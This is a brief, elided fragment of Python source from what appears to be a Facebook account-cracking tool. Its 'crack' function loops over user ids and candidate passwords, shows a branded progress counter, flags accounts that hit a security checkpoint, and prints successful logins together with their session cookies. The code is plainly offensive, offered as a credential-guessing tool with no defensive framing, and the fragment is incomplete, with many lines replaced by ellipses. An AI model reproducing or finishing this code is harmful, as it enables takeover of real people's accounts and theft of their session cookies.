...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \033[1;37mRaWa-SHAW⚡🌪️☄️ ]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}  "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[1;30m[\033[1;33m❌-CP\033[1;30m]\033[1;33m   {idf} | \033[1;33m{pw}')
                ...
                print(f'\r\x1b[32[OK🖤]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
